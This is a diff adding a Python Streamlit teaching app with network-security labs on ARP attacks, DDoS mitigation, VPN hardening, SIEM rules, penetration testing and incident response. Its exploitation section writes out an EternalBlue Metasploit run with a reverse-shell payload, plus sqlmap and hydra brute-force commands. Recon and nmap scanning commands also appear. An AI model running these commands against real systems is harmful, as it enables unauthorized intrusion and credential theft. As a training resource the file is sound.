+        making it vulnerable to various attacks that can compromise network security.
+        
+        **ARP Vulnerabilities:**
+        - 🔓 **No Authentication** - Anyone can send ARP replies
+        - 📢 **Broadcast Nature** - All devices receive ARP requests
+        - 💾 **Cache Poisoning** - Fake entries accepted
+        - 🔄 **Stateless Protocol** - No verification mechanism
+        
+        **Common ARP Attacks:**
+        
+        1. **ARP Spoofing/Poisoning**
+           - Send fake ARP replies
+           - Redirect traffic through attacker
+           - Man-in-the-middle position
+           - Sniff or modify traffic
+        
+        2. **ARP Cache Poisoning**
+           - Corrupt ARP tables
+           - Associate attacker MAC with gateway IP
+           - Intercept all external traffic
+        
+        3. **Gratuitous ARP Attack**
+           - Unsolicited ARP replies
+           - Update all device caches
+           - Claim IP addresses
+        
+        4. **ARP Flooding**
+           - Overwhelm switch CAM table
+           - Force hub mode
+           - Sniff all traffic
+        
+        **Attack Impact:**
+        - 🔍 **Traffic Interception** - Read sensitive data
+        - 🔄 **Session Hijacking** - Take over connections
+        - 🚫 **Denial of Service** - Disrupt connectivity
+        - 🎭 **Identity Theft** - Impersonate devices
+        
+        **Defense Mechanisms:**
+        
+        | Defense | Method | Effectiveness | Complexity |
+        |---------|--------|--------------|------------|
+        | Static ARP | Manual entries | High | High maintenance |
+        | DAI | Dynamic validation | Very High | Medium |
+        | Private VLANs | Isolation | Medium | Low |
+        | ARP Rate Limiting | Throttle ARP | Medium | Low |
+        | Port Security | MAC binding | Medium | Medium |
+        
+        **Dynamic ARP Inspection (DAI):**
+        - Validates ARP packets
+        - Uses DHCP snooping database
+        - Drops invalid ARP packets
+        - Rate limits ARP traffic
+        - Logs violations
+        
+        **DAI Configuration:**
+        ```
+        ip arp inspection vlan 10
+        ip arp inspection validate src-mac dst-mac ip
+        ip arp inspection limit rate 15
+        interface trusted
+         ip arp inspection trust
+        ```
+        
+        **Best Practices:**
+        - Enable DHCP snooping first
+        - Configure DAI on all VLANs
+        - Trust only infrastructure ports
+        - Monitor ARP inspection logs
+        - Use static ARP for critical servers
+        - Implement port security
+        - Regular security audits
+        """)
+    
+    # ARP Attacks
+    st.markdown("### 🚨 **ARP Attack Types**")
+    
+    attack = st.selectbox("Attack Type:", ["ARP Spoofing", "ARP Cache Poisoning", "Gratuitous ARP"])
+    
+    attack_info = {
+        "ARP Spoofing": "Attacker sends fake ARP messages to associate their MAC with legitimate IP",
+        "ARP Cache Poisoning": "Corrupting ARP cache with false MAC-IP mappings",
+        "Gratuitous ARP": "Unsolicited ARP replies to update victim's cache"
+    }
+    
+    st.warning(f"⚠️ **{attack}:** {attack_info[attack]}")
+    
+    # Dynamic ARP Inspection
+    st.markdown("### 🛡️ **Dynamic ARP Inspection (DAI)**")
+    
+    st.code("""
+    ! Enable DAI on VLANs
+    ip arp inspection vlan 10,20,30
+    
+    ! Configure trusted interfaces
+    interface GigabitEthernet0/24
+     ip arp inspection trust
+    
+    ! Configure rate limiting
+    interface range GigabitEthernet0/1-23
+     ip arp inspection limit rate 15
+    
+    ! Additional validations
+    ip arp inspection validate src-mac
+    ip arp inspection validate dst-mac
+    ip arp inspection validate ip
+    
+    ! Verification
+    show ip arp inspection
+    show ip arp inspection statistics
+    """, language="text")
+    
+    # IP Source Guard
+    st.markdown("### 🔒 **IP Source Guard**")
+    
+    st.code("""
+    ! Requires DHCP Snooping
+    interface GigabitEthernet0/1
+     ip verify source
+     ip verify source port-security
+    
+    ! Static IP binding
+    ip source binding 00AA.00BB.00CC vlan 10 192.168.1.100 interface Gi0/1
+    
+    ! Verification
+    show ip verify source
+    show ip source binding
+    """, language="text")
+
+def ddos_protection_lab():
+    """DDoS Protection Strategies"""
+    
+    st.markdown(create_lab_header("DDoS Protection Lab", "🚫", "linear-gradient(90deg, #FA8BFF 0%, #2BD2FF 50%, #2BFF88 100%)"), unsafe_allow_html=True)
+    
+    # Theory Section
+    with st.expander("📖 **DDoS Protection Theory**", expanded=True):
+        st.markdown("""
+        ### 🚫 **Understanding DDoS Protection**
+        
+        Distributed Denial of Service (DDoS) attacks overwhelm systems with traffic from multiple sources, 
+        requiring sophisticated detection and mitigation strategies to maintain service availability.
+        
+        **DDoS Attack Categories:**
+        
+        1. **Volume-Based (Layer 3-4)**
+           - UDP floods
+           - ICMP floods
+           - DNS amplification
+           - NTP amplification
+           - Measured in Gbps/Tbps
+        
+        2. **Protocol Attacks (Layer 3-4)**
+           - SYN floods
+           - ACK floods
+           - Fragmented packet attacks
+           - Smurf attacks
+           - Measured in packets per second
+        
+        3. **Application Layer (Layer 7)**
+           - HTTP floods
+           - Slowloris
+           - DNS query floods
+           - WordPress XML-RPC
+           - Measured in requests per second
+        
+        **Attack Characteristics:**
+        
+        | Type | Volume | Complexity | Detection | Mitigation |
+        |------|--------|------------|-----------|------------|
+        | Volume | Very High | Low | Easy | Rate limiting |
+        | Protocol | High | Medium | Medium | SYN cookies |
+        | Application | Low | High | Hard | WAF, Behavioral |
+        
+        **Detection Methods:**
+        - **Traffic Anomaly** - Baseline deviation
+        - **Rate-Based** - Threshold exceeded
+        - **Signature-Based** - Known patterns
+        - **Behavioral** - ML/AI analysis
+        - **Flow Analysis** - NetFlow/sFlow
+        
+        **Mitigation Strategies:**
+        
+        1. **Network Level**
+           - Rate limiting
+           - Black hole routing
+           - Scrubbing centers
+           - Anycast distribution
+           - BGP Flowspec
+        
+        2. **Protocol Level**
+           - SYN cookies
+           - Connection limits
+           - TCP reset
+           - IP spoofing prevention
+        
+        3. **Application Level**
+           - CAPTCHA challenges
+           - JavaScript validation
+           - Rate limiting per user
+           - Geo-blocking
+        
+        **DDoS Protection Services:**
+        - **CloudFlare** - Global anycast network
+        - **Akamai** - Prolexic platform
+        - **AWS Shield** - Automatic protection
+        - **Azure DDoS** - Adaptive tuning
+        - **Imperva** - Application focus
+        
+        **Amplification Factors:**
+        - DNS: 28-54x
+        - NTP: 556x
+        - SSDP: 30x
+        - CharGEN: 358x
+        - Memcached: 51,000x
+        
+        **Best Practices:**
+        - Implement rate limiting
+        - Deploy DDoS protection service
+        - Create incident response plan
+        - Regular DDoS drills
+        - Monitor traffic patterns
+        - Maintain contact with ISP
+        - Configure firewalls properly
+        - Keep systems updated
+        """)
+    
+    # DDoS Attack Types
+    st.markdown("### 💥 **DDoS Attack Types**")
+    
+    attack_type = st.selectbox("Attack Type:", ["SYN Flood", "UDP Flood", "ICMP Flood", "HTTP Flood", "Amplification"])
+    
+    if attack_type == "SYN Flood":
+        st.code("""
+        ! SYN Flood Protection - TCP Intercept
+        ip tcp intercept list 100
+        ip tcp intercept mode intercept
+        ip tcp intercept max-incomplete high 500
+        ip tcp intercept max-incomplete low 400
+        ip tcp intercept one-minute high 500
+        ip tcp intercept one-minute low 400
+        ip tcp intercept drop-mode oldest
+        
+        access-list 100 permit tcp any any
+        """, language="text")
+    
+    elif attack_type == "UDP Flood":
+        st.code("""
+        ! Rate Limiting UDP Traffic
+        class-map match-any UDP-TRAFFIC
+         match protocol udp
+        
+        policy-map RATE-LIMIT-UDP
+         class UDP-TRAFFIC
+          police 1000000 conform-action transmit exceed-action drop
+        
+        interface GigabitEthernet0/0
+         service-policy input RATE-LIMIT-UDP
+        """, language="text")
+    
+    elif attack_type == "ICMP Flood":
+        st.code("""
+        ! ICMP Rate Limiting
+        ip icmp rate-limit unreachable 10
+        
+        ! CAR (Committed Access Rate)
+        interface GigabitEthernet0/0
+         rate-limit input access-group 101 1000000 187500 375000 conform-action transmit exceed-action drop
+        
+        access-list 101 permit icmp any any
+        """, language="text")
+    
+    # Mitigation Techniques
+    st.markdown("### 🛡️ **Mitigation Techniques**")
+    
+    technique = st.selectbox("Mitigation:", ["Rate Limiting", "Black Hole", "Scrubbing", "CDN", "Anycast"])
+    
+    if technique == "Black Hole":
+        st.code("""
+        ! Remotely Triggered Black Hole (RTBH)
+        
+        ! Trigger Router
+        ip route 192.0.2.1 255.255.255.255 Null0 tag 666
+        router bgp 65001
+         redistribute static route-map RTBH
+        
+        route-map RTBH permit 10
+         match tag 666
+         set community 65001:666
+         set origin igp
+        
+        ! Edge Router
+        ip community-list 1 permit 65001:666
+        route-map BLACKHOLE permit 10
+         match community 1
+         set ip next-hop 192.0.2.1
+        """, language="text")
+
+def vpn_security_lab():
+    """VPN Security Best Practices"""
+    
+    st.markdown(create_lab_header("VPN Security Lab", "🔒", "linear-gradient(90deg, #00C9FF 0%, #92FE9D 100%)"), unsafe_allow_html=True)
+    
+    # VPN Security Checklist
+    st.markdown("### ✅ **VPN Security Checklist**")
+    
+    checklist = [
+        "Use strong encryption (AES-256)",
+        "Implement Perfect Forward Secrecy (PFS)",
+        "Use certificate-based authentication",
+        "Enable Dead Peer Detection (DPD)",
+        "Implement split tunneling carefully",
+        "Regular key rotation",
+        "Monitor VPN logs",
+        "Use 2FA for VPN access"
+    ]
+    
+    for item in checklist:
+        checked = st.checkbox(item, key=f"vpn_{item}")
+        if checked:
+            st.success(f"✓ {item}")
+    
+    # IPSec Best Practices
+    st.markdown("### 🔐 **IPSec Best Practices**")
+    
+    st.code("""
+    ! Strong IPSec Configuration
+    
+    ! IKEv2 Proposal
+    crypto ikev2 proposal STRONG-PROPOSAL
+     encryption aes-cbc-256 aes-gcm-256
+     integrity sha512 sha384
+     group 19 20 21
+    
+    ! IKEv2 Policy
+    crypto ikev2 policy STRONG-POLICY
+     proposal STRONG-PROPOSAL
+    
+    ! IPSec Transform Set
+    crypto ipsec transform-set AES256-SHA512 esp-aes 256 esp-sha512-hmac
+     mode tunnel
+    
+    ! IPSec Profile with PFS
+    crypto ipsec profile IPSEC-PROFILE
+     set transform-set AES256-SHA512
+     set pfs group19
+     set security-association lifetime seconds 3600
+     set security-association replay window-size 512
+    
+    ! Dead Peer Detection
+    crypto ikev2 profile IKEv2-PROFILE
+     dpd 10 3 periodic
+    """, language="text")
+
+def siem_lab():
+    """Security Information and Event Management"""
+    
+    st.markdown(create_lab_header("SIEM Lab", "📊", "linear-gradient(90deg, #FC466B 0%, #3F5EFB 100%)"), unsafe_allow_html=True)
+    
+    # Log Sources
+    st.markdown("### 📝 **Log Sources Configuration**")
+    
+    log_source = st.selectbox("Log Source:", ["Firewall", "IDS/IPS", "Switch", "Router", "Windows", "Linux"])
+    
+    if log_source == "Firewall":
+        st.code("""
+        ! Cisco ASA Syslog Configuration
+        logging enable
+        logging timestamp
+        logging buffer-size 1000000
+        logging buffered informational
+        logging host inside 192.168.1.100
+        logging trap informational
+        
+        ! Log specific events
+        logging message 106015 level debugging
+        logging message 106023 level debugging
+        """, language="text")
+    
+    elif log_source == "Linux":
+        st.code("""
+        # /etc/rsyslog.conf
+        
+        # Forward all logs to SIEM
+        *.* @@192.168.1.100:514
+        
+        # Forward auth logs
+        auth,authpriv.* @@192.168.1.100:514
+        
+        # Forward kernel logs
+        kern.* @@192.168.1.100:514
+        
+        # Restart rsyslog
+        systemctl restart rsyslog
+        """, language="bash")
+    
+    # Correlation Rules
+    st.markdown("### 🔗 **Correlation Rules**")
+    
+    rule_type = st.selectbox("Rule Type:", ["Brute Force", "Data Exfiltration", "Privilege Escalation", "Malware"])
+    
+    if rule_type == "Brute Force":
+        st.code("""
+        Rule: Detect Brute Force Attack
+        
+        Conditions:
+        - Event Type: Authentication Failure
+        - Count: > 5
+        - Time Window: 5 minutes
+        - Group By: Source IP, Destination User
+        
+        Actions:
+        - Generate Alert (High Priority)
+        - Block Source IP
+        - Notify Security Team
+        
+        Query:
+        event_type="authentication_failure" 
+        | stats count by src_ip, user 
+        | where count > 5
+        | eval risk_score=count*10
+        """, language="text")
+    
+    # Dashboard Metrics
+    st.markdown("### 📊 **Security Dashboard**")
+    
+    # Simulate metrics
+    col1, col2, col3, col4 = st.columns(4)
+    
+    with col1:
+        st.metric("Events/Hour", f"{random.randint(10000, 50000):,}")
+    
+    with col2:
+        st.metric("Critical Alerts", random.randint(0, 5))
+    
+    with col3:
+        st.metric("Failed Logins", random.randint(50, 200))
+    
+    with col4:
+        st.metric("Blocked IPs", random.randint(10, 50))
+
+def penetration_testing_lab():
+    """Penetration Testing Methodology"""
+    
+    st.markdown(create_lab_header("Penetration Testing Lab", "🕵️", "linear-gradient(90deg, #f093fb 0%, #f5576c 100%)"), unsafe_allow_html=True)
+    
+    # Pentest Phases
+    st.markdown("### 📋 **Penetration Testing Phases**")
+    
+    phase = st.selectbox("Phase:", ["Reconnaissance", "Scanning", "Exploitation", "Post-Exploitation", "Reporting"])
+    
+    if phase == "Reconnaissance":
+        st.markdown("#### **1️⃣ Reconnaissance**")
+        
+        recon_type = st.radio("Type:", ["Passive", "Active"])
+        
+        if recon_type == "Passive":
+            st.code("""
+            # OSINT Gathering
+            
+            # DNS Reconnaissance
+            host -t ns example.com
+            host -t mx example.com
+            
+            # Whois Information
+            whois example.com
+            
+            # Google Dorking
+            site:example.com filetype:pdf
+            site:example.com inurl:admin
+            
+            # Shodan Search
+            hostname:example.com
+            org:"Example Company"
+            
+            # Certificate Transparency
+            https://crt.sh/?q=%.example.com
+            """, language="bash")
+        else:
+            st.code("""
+            # Active Reconnaissance
+            
+            # DNS Enumeration
+            dnsrecon -d example.com
+            dnsenum example.com
+            
+            # Subdomain Enumeration
+            gobuster dns -d example.com -w wordlist.txt
+            
+            # Directory Enumeration
+            gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt
+            
+            # Technology Detection
+            whatweb example.com
+            wafw00f example.com
+            """, language="bash")
+    
+    elif phase == "Scanning":
+        st.markdown("#### **2️⃣ Scanning**")
+        
+        st.code("""
+        # Network Scanning
+        
+        # Host Discovery
+        nmap -sn 192.168.1.0/24
+        
+        # Port Scanning
+        nmap -sS -sV -O -A 192.168.1.100
+        nmap -p- --min-rate=1000 192.168.1.100
+        
+        # UDP Scanning
+        nmap -sU --top-ports 100 192.168.1.100
+        
+        # Vulnerability Scanning
+        nmap --script vuln 192.168.1.100
+        
+        # Service Enumeration
+        enum4linux 192.168.1.100
+        smbclient -L //192.168.1.100
+        """, language="bash")
+    
+    elif phase == "Exploitation":
+        st.markdown("#### **3️⃣ Exploitation**")
+        
+        st.warning("⚠️ **Legal Warning:** Only test on systems you own or have permission to test!")
+        
+        st.code("""
+        # Metasploit Framework
+        
+        msfconsole
+        
+        # Search for exploits
+        search type:exploit platform:windows smb
+        
+        # Use exploit
+        use exploit/windows/smb/ms17_010_eternalblue
+        set RHOSTS 192.168.1.100
+        set PAYLOAD windows/x64/meterpreter/reverse_tcp
+        set LHOST 192.168.1.10
+        exploit
+        
+        # Manual Exploitation
+        # SQL Injection
+        sqlmap -u "http://example.com/page?id=1" --dbs
+        
+        # Password Attacks
+        hydra -l admin -P passwords.txt ssh://192.168.1.100
+        """, language="bash")
+
+def incident_response_lab():
+    """Incident Response Procedures"""
+    
+    st.markdown(create_lab_header("Incident Response Lab", "🚨", "linear-gradient(90deg, #FA8BFF 0%, #2BD2FF 50%, #2BFF88 100%)"), unsafe_allow_html=True)
+    
+    # Incident Response Phases
+    st.markdown("### 📋 **NIST Incident Response Lifecycle**")
+    
+    phases = {
+        "1. Preparation": "Establish IR team, tools, procedures",
+        "2. Detection & Analysis": "Identify and validate incidents",
+        "3. Containment": "Limit damage and prevent spread",
+        "4. Eradication": "Remove threat from environment",
+        "5. Recovery": "Restore systems to normal",
+        "6. Lessons Learned": "Document and improve process"
+    }
+    
+    selected_phase = st.selectbox("Select Phase:", list(phases.keys()))
+    st.info(phases[selected_phase])
+    
+    # Incident Checklist
+    st.markdown("### ✅ **Initial Response Checklist**")
+    
+    checklist_items = [
+        "Document everything (time, actions, observations)",
+        "Isolate affected systems",
+        "Preserve evidence (memory, logs, disk)",
+        "Identify attack vector",
+        "Determine scope of compromise",
+        "Notify stakeholders",
+        "Engage legal/law enforcement if needed",
+        "Begin containment procedures"
+    ]
+    
+    for item in checklist_items:
+        st.checkbox(item, key=f"ir_{item}")
+    
+    # Forensic Commands
+    st.markdown("### 🔍 **Forensic Data Collection**")
+    
+    os_type = st.selectbox("System Type:", ["Windows", "Linux"])
+    
+    if os_type == "Windows":
+        st.code("""
+        REM Windows Forensics Commands
+        
+        REM Network connections
+        netstat -anob > netstat.txt
+        
+        REM Running processes
+        tasklist /v > processes.txt
+        wmic process list full > wmic_processes.txt
+        
+        REM System information
+        systeminfo > systeminfo.txt
+        
+        REM User accounts
+        net user > users.txt
+        net localgroup administrators > admins.txt
+        
+        REM Scheduled tasks
+        schtasks /query /fo LIST /v > scheduled_tasks.txt
+        
+        REM Registry autorun
+        reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
+        
+        REM Event logs
+        wevtutil epl System system.evtx
+        wevtutil epl Security security.evtx
+        """, language="batch")
+    else:
+        st.code("""
+        # Linux Forensics Commands
+        
+        # System information
+        uname -a > system_info.txt
+        cat /etc/os-release >> system_info.txt
+        
+        # Network connections
+        netstat -tulpan > netstat.txt
+        ss -tulpan > ss.txt
+        
+        # Running processes
+        ps auxww > processes.txt
+        lsof -n > open_files.txt
+        
+        # User information
+        cat /etc/passwd > users.txt
+        last > last_logins.txt
+        w > current_users.txt
+        
+        # Cron jobs
+        crontab -l > user_cron.txt
+        cat /etc/crontab > system_cron.txt
+        
+        # Logs
+        tar czf logs.tar.gz /var/log/
+        
+        # Memory dump (requires LiME)
+        insmod lime.ko "path=/tmp/memory.lime format=lime"
+        """, language="bash")
+    
+    # Incident Report Template
+    st.markdown("### 📄 **Incident Report Template**")
+    
+    if st.button("Generate Report Template", key="gen_report"):
+        report = f"""
+        # INCIDENT REPORT
+        
+        **Report ID:** INC-{datetime.now().strftime('%Y%m%d-%H%M')}
+        **Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+        
+        ## Executive Summary
+        [Brief description of incident and impact]
+        
+        ## Incident Details
+        - **Detection Time:** 
+        - **Response Time:**
+        - **Resolution Time:**
+        - **Severity:** Critical/High/Medium/Low
+        - **Type:** Malware/Breach/DoS/Other
+        
+        ## Affected Systems
+        - System 1: [IP/Hostname]
+        - System 2: [IP/Hostname]
+        
+        ## Timeline of Events
+        1. [Time] - Initial detection
+        2. [Time] - Response initiated
+        3. [Time] - Containment completed
+        
+        ## Root Cause Analysis
+        [Description of how the incident occurred]
+        
+        ## Remediation Actions
+        - [ ] Action 1
+        - [ ] Action 2
+        
+        ## Lessons Learned
+        - Finding 1
+        - Finding 2
+        
+        ## Recommendations
+        - Recommendation 1
+        - Recommendation 2
+        """
+        
+        st.code(report, language="markdown")
+
+if __name__ == "__main__":
+    run_lab()
